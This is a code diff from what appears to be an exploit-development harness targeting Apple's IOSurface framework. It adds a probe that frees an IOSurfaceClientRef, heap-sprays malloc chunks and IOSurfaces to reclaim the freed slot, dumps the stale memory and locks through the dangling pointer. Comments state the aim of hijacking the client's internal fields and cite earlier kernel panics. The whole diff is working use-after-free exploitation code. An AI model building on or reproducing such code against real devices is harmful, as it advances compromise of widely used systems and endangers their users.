@@ -4041,6 +4041,181 @@ static void r296_probe(void) {
     fflush(stdout);
 }
 
+/* r297: Dump IOSurfaceClientRef struct layout and spray into freed slot.
+ * r296 CONFIRMED:
+ *   - Kernel object fully freed (IOSurfaceLookup returns NULL)
+ *   - ClientLock on freed client succeeds 2/3 trials
+ *   - spray[0].seed=1 confirms kernel locked spray via stale ID
+ *   - This is a USERSPACE UAF: freed client data in heap, no MTE
+ *
+ * GOAL: Map out the IOSurfaceClientRef struct layout so we can spray
+ * controlled data to hijack the client's internal fields.
+ *
+ * Part 1: Dump raw bytes of a live IOSurfaceClientRef (before free)
+ *         r292 showed client stride is 0x1C0=448 bytes
+ * Part 2: Free the client, spray with known pattern, dump again
+ * Part 3: Check which fields ClientLock reads from the struct
+ */
+static void r297_probe(void) {
+    rlog("\n=== r297: IOSurfaceClientRef struct layout dump ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef kern_return_t (*clientLock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef kern_return_t (*clientUnlock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef uint32_t (*clientGetID_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientLock_t clLock = (clientLock_t)dlsym(iosurfH, "IOSurfaceClientLock");
+    clientUnlock_t clUnlock = (clientUnlock_t)dlsym(iosurfH, "IOSurfaceClientUnlock");
+    clientGetID_t clGetID = (clientGetID_t)dlsym(iosurfH, "IOSurfaceClientGetID");
+
+    int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+
+    /* Part 1: Dump live client struct */
+    rlog("--- Part 1: Live client struct dump ---\n");
+    fflush(stdout);
+
+    CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+    CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+    CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+    CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+    CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+    CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+    CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+    CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+    CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+    IOSurfaceRef victim = IOSurfaceCreate(p);
+    CFRelease(p);
+    uint32_t victimID = IOSurfaceGetID(victim);
+
+    IOSurfaceClientRef client = clLookup(victimID);
+    IOSurfaceClientRef cl_x1 = clLookup(victimID);
+    IOSurfaceClientRef cl_x2 = clLookup(victimID);
+
+    rlog("  victim id=%u client=%p\n", victimID, client);
+    uint64_t *raw = (uint64_t *)client;
+    rlog("  client struct (first 56 qwords = 448 bytes = 0x1C0):\n");
+    for (int i = 0; i < 56; i += 4) {
+        rlog("    +0x%03x: %016llx %016llx %016llx %016llx\n",
+            i*8, raw[i], raw[i+1], raw[i+2], raw[i+3]);
+    }
+    fflush(stdout);
+
+    uint32_t clientID = clGetID ? clGetID(client) : 0;
+    rlog("  ClientGetID=%u (should match victimID=%u)\n", clientID, victimID);
+
+    for (int off = 0; off < 56; off++) {
+        uint32_t lo = (uint32_t)(raw[off] & 0xFFFFFFFF);
+        uint32_t hi = (uint32_t)(raw[off] >> 32);
+        if (lo == victimID) rlog("  ** ID found at +0x%03x (low32)\n", off*8);
+        if (hi == victimID) rlog("  ** ID found at +0x%03x (high32)\n", off*8+4);
+    }
+    fflush(stdout);
+
+    /* Part 2: Free everything and spray, then dump the slot */
+    rlog("\n--- Part 2: Free client + spray, dump same address ---\n");
+    fflush(stdout);
+
+    uintptr_t client_addr = (uintptr_t)client;
+
+    CFRelease(victim);
+    clRelease(cl_x1);
+    clRelease(cl_x2);
+    clRelease(client);
+    rlog("  freed all refs\n");
+
+    /* Spray with malloc to try to reclaim the client's heap slot.
+     * Client was 448 bytes. We spray chunks of that size with known pattern. */
+    #define R297_SPRAY_COUNT 256
+    #define R297_CLIENT_SIZE 448
+    void *spray_ptrs[R297_SPRAY_COUNT];
+    for (int i = 0; i < R297_SPRAY_COUNT; i++) {
+        spray_ptrs[i] = malloc(R297_CLIENT_SIZE);
+        memset(spray_ptrs[i], 0x41 + (i & 0xF), R297_CLIENT_SIZE);
+        /* Write a recognizable pattern at the start */
+        uint64_t *sp = (uint64_t *)spray_ptrs[i];
+        sp[0] = 0xDEADBEEF00000000ULL | i;
+    }
+
+    /* Check if any spray landed at client_addr */
+    uint64_t *post_raw = (uint64_t *)client_addr;
+    int spray_hit = -1;
+    for (int i = 0; i < R297_SPRAY_COUNT; i++) {
+        if ((uintptr_t)spray_ptrs[i] == client_addr) { spray_hit = i; break; }
+    }
+    rlog("  spray_hit=%d (direct addr match)\n", spray_hit);
+
+    rlog("  post-free data at client addr %p:\n", (void*)client_addr);
+    for (int i = 0; i < 56; i += 4) {
+        rlog("    +0x%03x: %016llx %016llx %016llx %016llx\n",
+            i*8, post_raw[i], post_raw[i+1], post_raw[i+2], post_raw[i+3]);
+    }
+    fflush(stdout);
+
+    /* Part 3: Spray IOSurface-sized objects to reclaim with IOSurface data */
+    rlog("\n--- Part 3: Spray IOSurfaces and check reuse ---\n");
+    fflush(stdout);
+
+    for (int i = 0; i < R297_SPRAY_COUNT; i++) free(spray_ptrs[i]);
+
+    IOSurfaceRef sprays[64];
+    int reused_idx = -1;
+    for (int i = 0; i < 64; i++) {
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef spfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef sasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceWidth"),swn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceHeight"),shn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerElement"),sbn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerRow"),srn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfacePixelFormat"),spfn);
+        CFDictionarySetValue(sp,CFSTR("IOSurfaceAllocSize"),sasn);
+        CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spfn);CFRelease(sasn);
+        sprays[i] = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        if (sprays[i] && IOSurfaceGetID(sprays[i]) == victimID) reused_idx = i;
+    }
+    rlog("  reused_idx=%d (spray with victim's ID)\n", reused_idx);
+
+    rlog("  post-IOSurface-spray data at client addr %p:\n", (void*)client_addr);
+    for (int i = 0; i < 56; i += 4) {
+        rlog("    +0x%03x: %016llx %016llx %016llx %016llx\n",
+            i*8, post_raw[i], post_raw[i+1], post_raw[i+2], post_raw[i+3]);
+    }
+
+    /* Try ClientLock on the original address */
+    rlog("\n  ClientLock on stale addr after IOSurface spray...\n");
+    fflush(stdout);
+    uint32_t seed = 0;
+    kern_return_t lr = clLock(client, 0, &seed);
+    rlog("  ClientLock=0x%x seed=%u\n", lr, seed);
+    if (lr == 0) {
+        rlog("  SUCCEEDED — kernel processed lock via stale client\n");
+        clUnlock(client, 0, NULL);
+    }
+
+    for (int i = 0; i < 64; i++) if (sprays[i]) CFRelease(sprays[i]);
+
+    rlog("\n*** r297 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -29289,6 +29464,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 297) {
+            rlog("*** rounds=297: IOSurfaceClientRef struct layout dump ***\n");
+            rlog("  r296: Userspace UAF confirmed. Need struct layout for spray.\n\n");
+            fflush(stdout);
+            r297_probe();
             goto done;
         }
         if (rounds == 296) {
